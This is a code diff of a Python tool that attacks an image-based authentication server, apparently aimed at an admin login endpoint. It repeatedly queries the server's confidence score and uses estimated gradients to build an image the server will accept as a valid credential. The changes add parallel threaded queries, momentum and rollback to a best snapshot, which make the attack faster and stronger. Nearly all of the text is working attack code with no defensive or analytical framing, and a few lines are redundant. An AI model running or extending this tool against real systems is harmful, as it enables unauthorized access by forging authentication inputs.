@@ -6,7 +6,8 @@ from   torchvision.utils import save_image
 import torchvision.io as tvio
 import numpy as np
 import io
-from PIL import Image
+from   PIL import Image
+from   concurrent.futures import ThreadPoolExecutor
 
 # http://localhost:8000/api/v1/auth/Admin
 
@@ -15,17 +16,38 @@ def run_attack(args):
     if not args.output:
         args.output = "tensor.png"
 
+    # Tool settings
     SERVER_URL = input("Authentication url to attack: ")
+    MAX_WORKERS = 10            # Threading
+    FD_SAMPLES  = MAX_WORKERS   # Sample average
 
-    EMBED_SIZE  = 512   # Embedding dimensions
-    SEND_SIZE   = 160   # Target send dimensions
-    SIGMA       = 0.18  # Explore rate
-    LR          = 0.42  # Learning rate
-    DECAY       = 0.95  # Learning & explore decay (breaking)
-    UNSTUCK     = 3     # If learning starts to plateau (No. of times)
-    FD_SAMPLES  = 25    # Sample average
-    STEPS       = 1000  # How many steps to train the inversion model
-    EARLY_STOP  = 0.95  # Early stop %
+    # Adjustable reverse engineering parameter
+    EMBED_SIZE  = 512       # Embedding dimensions
+    SEND_SIZE   = 160       # Target send dimensions
+    LR          = 0.15      # Learning rate (Alpha)
+    BETA        = 0.98      # Momentum coefficient
+    SIGMA       = 0.07      # Explore rate
+    DECAY       = 0.50      # Learning & explore decay (breaking)
+    STEPS       = 3000      # How many steps to train the inversion model
+    CUT_LOSS    = -0.0006   # Reduce learning rate threshold
+    EARLY_STOP  = 0.90      # Early stop % 
+
+    # --------------------------- #
+
+    device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
+    
+    # Model data
+    generated = torch.rand(1, 3, EMBED_SIZE, EMBED_SIZE, device=device)
+    velocity = torch.zeros_like(generated)
+    current_score = 0.0
+    high_score = 0.0
+    lr = LR
+    sigma = SIGMA
+    min_lr = LR / 10
+    min_sigma = SIGMA / 10
+
+    # Restore point
+    best_state = None
 
     def tensor_to_png_bytes(img_tensor):
         img = img_tensor.squeeze().detach()
@@ -43,31 +65,25 @@ def run_attack(args):
         response = requests.post(SERVER_URL, files=files)
         return response.json()["confidence"]
 
-    device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
-    generated = torch.rand(1, 3, EMBED_SIZE, EMBED_SIZE, device=device)
-    current_score = 0.0
-    high_score = 0.0
-    stuck = 0
-    lr = LR
-    sigma = SIGMA
-    min_lr = LR / 10
-    min_sigma = SIGMA / 10
+    def evaluate_perturbation(_):
+        u = torch.randn_like(generated)
+        perturbed = (generated + sigma * u).clamp(0, 1)
+        score = query_server(perturbed)
+        return u, score
 
-    print("\033[?25lLoading...\r", end="")
+    print("\033[?25l* Waiting for data...\r", end="")
 
     for step in range(STEPS):
         grad_estimate = torch.zeros_like(generated)
         noise_list = []
         score_list = []
 
-        for _ in range(FD_SAMPLES):
-            u = torch.randn_like(generated)
-            noise_list.append(u)
-
-            perturbed = (generated + sigma * u).clamp(0,1)
-            score = query_server(perturbed)
-
-            score_list.append(score)
+        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
+            futures = [executor.submit(evaluate_perturbation, i) for i in range(FD_SAMPLES)]
+            for future in futures:
+                u, score = future.result()
+                noise_list.append(u)
+                score_list.append(score)
 
         score_mean = np.mean(score_list)
 
@@ -77,24 +93,39 @@ def run_attack(args):
 
         grad_estimate /= (FD_SAMPLES * sigma)
 
-        generated = (generated + lr * grad_estimate).clamp(0,1)
+        velocity = BETA * velocity + grad_estimate
+        generated = (generated + lr * velocity).clamp(0, 1)
 
         new_score = query_server(generated)
-        if new_score >= high_score:
+        loss_delta = high_score - new_score
+
+        if new_score > high_score:
             high_score = new_score
-            stuck = 0
-        else:
-            stuck += 1
+            best_state = {
+                "generated": generated.detach().clone(),
+                "best_score": high_score if high_score > high_score else high_score
+            }
 
-        # Update learning
-
-        if stuck > UNSTUCK:
-            print("")
-            lr    = max(min_lr,    lr    * DECAY)
-            sigma = max(min_sigma, sigma * DECAY)
+        if loss_delta > CUT_LOSS:
+            # Restore data
+            print("\nRegression detected! Restoring highest score snopshot...\r", end="")
+            CUT_LOSS *= 0.75
+            generated = best_state["generated"].clone()
+            velocity = torch.zeros_like(generated)
             high_score = 0.0
+            # Re-calculate generation
+            lr = max(min_lr, lr * DECAY)
+            sigma = max(min_sigma, sigma * DECAY)
+            grad_estimate = torch.zeros_like(generated)
+            velocity = BETA * velocity + grad_estimate
+            generated = (generated + lr * velocity).clamp(0, 1)
 
-        print(f"\033[n [{step + 1}/{STEPS}]: Accuracy {high_score * 100:.4f}% ({lr:.6f}α/{sigma:.6f}σ) stuck {stuck}.\r", end="")
+        if high_score == 0.0:
+            print("\033[n\x1b[2K* Waiting for data...\r", end="")
+        else:
+            vel_mag = torch.norm(velocity)
+            print(f"\033[n\x1b[2K* [{step + 1}/{STEPS}]: Accuracy {high_score * 100:.3f}% (α={lr:.6f}, ‖v‖₂={vel_mag.item():.6f}, σ={sigma:.6f})", end="\r\n")
+            print(f"\033[n\x1b[2K< loss delta: {loss_delta:.6f} | best {best_state["best_score"] * 100:.3f}% >\r\033[F", end="")
 
         current_score = score
         # ---- EARLY STOP ----
